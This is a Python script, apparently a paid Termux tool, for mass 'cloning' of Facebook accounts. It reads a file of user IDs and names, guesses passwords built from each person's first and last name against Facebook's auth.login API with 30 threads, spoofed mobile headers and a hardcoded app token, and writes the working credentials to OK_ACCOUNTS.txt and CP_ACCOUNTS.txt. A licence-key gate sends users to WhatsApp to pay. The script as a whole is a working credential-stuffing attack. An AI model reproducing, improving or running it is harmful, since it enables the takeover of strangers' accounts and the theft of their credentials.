import os, requests, json, time, re, random, sys, uuid, string, subprocess
from concurrent.futures import ThreadPoolExecutor as ThreadPool
from bs4 import BeautifulSoup

# -----------------------[ COLOR CODES ]-----------------------#
G = "\033[1;32m"  # Green
W = "\x1b[1;97m"  # White
R = "\x1b[1;31m"  # Red
Y = "\033[1;33m"  # Yellow

# -----------------------[ LOGO ]-----------------------#
os.system('espeak -a 300 "well,come to,fb,tools,file,clone, tools"')
logo = f'''
{G}╔══════════════════════════════════════════╗
{G}║ {W}███╗   ███╗███████╗██╗  ██╗███████╗██████╗ {G}║
{G}║ {W}████╗ ████║██╔════╝██║  ██║██╔════╝██╔══██╗{G}║
{G}║ {W}██╔████╔██║█████╗  ███████║█████╗  ██║  ██║{G}║
{G}║ {W}██║╚██╔╝██║██╔══╝  ██╔══██║██╔══╝  ██║  ██║{G}║
{G}║ {W}██║ ╚═╝ ██║███████╗██║  ██║███████╗██████╔╝{G}║
{G}╚══════════════════════════════════════════╝
{W}TOOL : FILE CLONING
{W}{47*'-'}
'''

# -----------------------[ FUNCTION: CLEAR SCREEN ]-----------------------#
def clear():
    os.system("clear")
    print(logo)


# -----------------------[ FUNCTION: USER AGENT ]-----------------------#
def get_random_user_agent():
    ua_list = [
        "Mozilla/5.0 (Linux; Android 12; SM-G998B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Mobile Safari/537.36",
        "Mozilla/5.0 (iPhone; CPU iPhone OS 16_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.2 Mobile/15E148 Safari/604.1",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Linux; Android 11; Redmi Note 10) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Mobile Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36"
    ]
    return random.choice(ua_list)

# -----------------------[ FUNCTION: MAIN MENU ]-----------------------#
def main():
    clear()
    print(f"{G}[1] START FILE CLONING")
    print(f"{R}[0] EXIT")
    choice = input(f"{Y}[?] SELECT: {W}")
    if choice == "1":
        file_cloning()
    elif choice == "0":
        exit()
    else:
        print(f"{R}INVALID OPTION! TRY AGAIN.")
        time.sleep(1)
        main()

# -----------------------[ FUNCTION: FILE CLONING ]-----------------------#
def file_cloning():
    clear()
    file_path = input(f"{Y}[?] ENTER FILE PATH: {W}")
    
    try:
        with open(file_path, "r") as file:
            accounts = file.readlines()
    except FileNotFoundError:
        print(f"{R}FILE NOT FOUND! TRY AGAIN.")
        time.sleep(1)
        file_cloning()

    clear()
    try:
        pass_limit = int(input(f"{Y}[?] ENTER PASSWORD LIMIT: {W}"))
    except ValueError:
        pass_limit = 5

    passwords = [input(f"{G}[{i+1}] ENTER PASSWORD: {W}") for i in range(pass_limit)]

    with ThreadPool(max_workers=30) as executor:
        print(f"{G}[!] TOTAL ACCOUNTS: {len(accounts)}")
        print(f"{G}[!] IF NO RESULT, TRY ON/OFF AIRPLANE MODE")
        print(W + 47 * "-")
        
        for user in accounts:
            user_id, name = user.strip().split("|")
            executor.submit(check_account, user_id, name, passwords)

    print(f"{G}[✓] PROCESS COMPLETED!")
    exit()

# -----------------------[ FUNCTION: CHECK ACCOUNT ]-----------------------#
def check_account(user_id, name, passwords):
        global oks, cps
        first_name = name.split(" ")[0]
        last_name = name.split(" ")[1] if len(name.split(" ")) > 1 else first_name

        for pw in passwords:
            password = pw.replace("first", first_name.lower()).replace("last", last_name.lower())
            session = requests.Session()
            headers = {
                "User-Agent": get_random_user_agent(),
                "Content-Type": "application/x-www-form-urlencoded",
                "Host": "b-graph.facebook.com",
                "X-FB-Net-HNI": str(random.randint(20000, 40000)),
                "X-FB-SIM-HNI": str(random.randint(20000, 40000)),
                "X-FB-Connection-Type": "MOBILE.LTE",
                "X-Tigon-Is-Retry": "False",
                "X-FB-Friendly-Name": "ViewerReactionsMutation",
                "X-FB-HTTP-Engine": "Liger",
                "X-FB-Client-IP": "True",
                "X-FB-Server-Cluster": "True"
            }
        
            data = {
                "adid": str(uuid.uuid4()),
                "format": "json",
                "device_id": str(uuid.uuid4()),
                "cpl": "true",
                "email": user_id,
                "password": password,
                "access_token": "256002347743983|374e60f8b9bb6b8cbb30f78030438895",
                "generate_session_cookies": "1",
                "method": "auth.login"
            }
        
            response = session.post("https://api.facebook.com/auth/login", data=data, headers=headers).json()
        
            if "session_key" in response:
                print(f"{G}[OK] {user_id} | {password}")
                open("OK_ACCOUNTS.txt", "a").write(f"{user_id}|{password}\n")
                oks.append(user_id)
                break
            elif "www.facebook.com" in response.get("error", {}).get("message", ""):
                print(f"{Y}[CP] {user_id} | {password}")
                open("CP_ACCOUNTS.txt", "a").write(f"{user_id}|{password}\n")
                cps.append(user_id)
                break

# -----------------------[ FUNCTION: KEY APPROVAL ]-----------------------#
def main_apv():
    os.system('clear')
    ak = "FB-TOOLS-"
    clear()
    os.system('xdg-open https://chat.whatsapp.com/Elo28LjmJvzL5n6UnU1r0L')

    try:
        key1 = open('/data/data/com.termux/files/usr/bin/.fb.tool-cov', 'r').read()
    except IOError:
        os.system("clear")
        clear()
        print(f'''{G}--------------------------------------------------------------''')
        print(f'''{W}  Your Token Is Not Approved Already''')
        print(f'''{G}--------------------------------------------------------------''')
        print(f'''       THIS TOOL IS PAID

                    7 day              1$
                   15 day.             2$
                   30 day.             3$ ''')
        print(f'''{G}--------------------------------------------------------------''')
        myid = uuid.uuid4().hex[:10].upper()
        print(f''' {W}    THIS IS YOUR KEY : ''' + ak + myid)
        print(f'''{G}--------------------------------------------------------------''')
        with open('/data/data/com.termux/files/usr/bin/.fb.tool-cov', 'w') as kok:
            kok.write(myid)
        print("")
        print("     Copy Key And Sent Me WhatsApp Approval")
        print(f'''{G}--------------------------------------------------------------''')
        time.sleep(6)
        os.system("xdg-open https://wa.me/+212601279101")
        exit()

    r1 = requests.get("https://github.com/mohadimo/Kay/blob/main/Kay.txt").text
    if key1 in r1:
        main()  # تشغيل القائمة الرئيسية بعد الموافقة
    else:
        os.system("clear")
        os.system('xdg-open https://whatsapp.com/channel/0029Va0pIfL7Noa7wnN8sp13')
        clear()
        print (f'''{G}--------------------------------------------------------------''')
        print(f''' {W} Your Token Is Not Approved''')
        print(f'''{G}--------------------------------------------------------------''')
        print(f'''{W}       THIS TOOL IS PAID

                7 day→→→→→→→→1$
               15 day→→→→→→→→2$
               30 day→→→→→→→→3$ ''')
        print(f'''{G}--------------------------------------------------------------''')
        print(f'''{W}          YOUR KEY : ''' + ak + key1)
        print(f'''{G}--------------------------------------------------------------''')
        print(f'''{W}     Copy Key And Sent Me WhatsApp Approval''')
        print(f'''{G}--------------------------------------------------------------''')
        time.sleep(3.5)
        os.system("xdg-open https://wa.me/+212601279101")
        exit()

# -----------------------[ RUN SCRIPT ]-----------------------#
oks, cps = [], []
if __name__ == "__main__":
    try:
        main_apv()  # التحقق من المفتاح قبل تشغيل أي شيء
    except requests.exceptions.ConnectionError:
        print(f"{R}NETWORK ERROR! CHECK YOUR INTERNET CONNECTION.")
        exit()
    except Exception as e:
        print(f"{R}ERROR: {str(e)}")
        exit()